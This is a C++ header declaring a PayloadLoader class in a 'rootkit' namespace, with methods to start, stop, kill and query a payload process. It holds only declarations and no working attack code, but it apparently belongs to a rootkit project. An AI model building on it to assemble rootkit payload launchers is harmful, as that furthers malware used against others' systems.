#ifndef ROOTKIT_PAYLOAD_LOADER_H
#define ROOTKIT_PAYLOAD_LOADER_H

#include <optional>
#include <sys/types.h>
#include <string>
#include "rootkit/ConfigManager.hpp"
#include "rootkit/issues/Error.hpp"
#include "rootkit/issues/Info.hpp"
#include "rootkit/issues/Logger.hpp"
#include "rootkit/issues/Warning.hpp"

namespace rootkit {

class PayloadLoader {
private:
    pid_t pid;
    std::string payload_path;
    issues::Warning warning;
    issues::Error error;
    issues::Info info;

    const int KILL_MAX_WAITING_TIME_IN_MS = 500;
    const int KILL_WAITING_TIME_IN_MS = 100;

public:
    /**
     * @brief Basic constructor
     * @param payload_path Path to the payload
     */
    PayloadLoader(const PayloadConfig& conf, const issues::Logger& logger);

    /**
     * @brief Stops payload from running
     */
    ~PayloadLoader();

    /**
     * @brief returns pid of running process,
     * if there is no running process returns nullopt
     */
    std::optional<pid_t> get_pid();

    /**
     * @brief returns true if process is running, false otherwise
     */
    bool is_running();

    /**
     * @brief Start payload
     * @returns true if payload was started successfully, and false otherwise
     */
    bool start();

    /**
     * @brief Stop payload
     * @returns true if payload was stopped correctly, and false otherwise
     */
    bool stop();

    /**
     * @brief In case that payload doesn't stop, this can send SIGKILL signal
     * to it
     */
    void kill();
};

}

#endif
